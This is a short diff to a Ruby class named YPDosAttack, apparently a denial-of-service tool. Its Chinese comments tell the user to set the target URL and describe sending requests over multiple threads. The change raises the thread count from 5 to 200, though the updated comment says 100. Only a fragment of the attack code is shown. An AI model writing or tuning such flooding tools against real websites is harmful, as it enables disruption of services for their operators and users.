@@ -9,7 +9,7 @@ class YPDosAttack
         uri = URI(url) # 修改为你想要请求的网址
 
         n = 10 # 发送 10 个请求
-        concurrency = 5 # 使用 5 个线程
+        concurrency = 200 # 使用 100 个线程
         if request_count
             n = request_count.to_i
         end
